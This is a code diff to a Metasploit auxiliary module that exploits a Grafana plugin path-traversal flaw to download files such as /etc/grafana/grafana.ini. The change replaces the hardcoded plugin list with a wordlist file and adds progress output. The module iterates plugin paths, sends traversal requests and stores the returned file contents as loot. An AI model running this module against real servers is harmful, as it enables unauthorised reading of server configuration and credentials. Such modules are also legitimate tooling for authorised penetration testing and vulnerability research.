@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
+
   def initialize(info = {})
     super(
       update_info(
@@ -41,9 +42,17 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(3000),
         OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),
-        OptInt.new('DEPTH', [true, 'Traversal depth', 13])
+        OptInt.new('DEPTH', [true, 'Traversal depth', 13]),
+        OptPath.new('PLUGINS_FILE', [
+          true, 'File containing plugins to enumerate',
+          File.join(Msf::Config.data_directory, 'wordlists', 'grafana_plugins.txt')
+        ]),
       ]
     )
+  end
+
+  def print_progress(host, current, total)
+    print_status("#{host} - Progress #{current.to_s.rjust(Math.log10(total).ceil + 1)}/#{total} (#{((current.to_f / total) * 100).truncate(2)}%)")
   end
 
   def check
@@ -72,48 +81,13 @@ class MetasploitModule < Msf::Auxiliary
     check_code = check
     return unless check_code == Exploit::CheckCode::Appears
 
-    [
-      'alertlist',
-      'annolist',
-      'barchart',
-      'bargauge',
-      'candlestick',
-      'cloudwatch',
-      'dashlist',
-      'elasticsearch',
-      'gauge',
-      'geomap',
-      'gettingstarted',
-      'grafana-azure-monitor-datasource',
-      'graph',
-      'heatmap',
-      'histogram',
-      'influxdb',
-      'jaeger',
-      'logs',
-      'loki',
-      'mssql',
-      'mysql',
-      'news',
-      'nodeGraph',
-      'opentsdb',
-      'piechart',
-      'pluginlist',
-      'postgres',
-      'prometheus',
-      'stackdriver',
-      'stat',
-      'state-timeline',
-      'status-history',
-      'table',
-      'table-old',
-      'tempo',
-      'testdata',
-      'text',
-      'timeseries',
-      'welcome',
-      'zipkin'
-    ].each do |plugin|
+    f = File.open(datastore['PLUGINS_FILE'], 'rb')
+    total = f.readlines.count
+    f.rewind
+    f = f.readlines
+    f.each_with_index do |plugin, i|
+      plugin = plugin.strip
+      print_progress(target_host, i, total)
       vprint_status("Attempting plugin: #{plugin}")
       res = send_request_cgi({
         'method' => 'GET',
@@ -121,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
       })
       next unless res && res.code == 200
 
-      print_status("#{plugin} was found and exploited successfully")
+      print_good("#{plugin} was found and exploited successfully")
       vprint_good(res.body)
       path = store_loot(
         'grafana.loot',
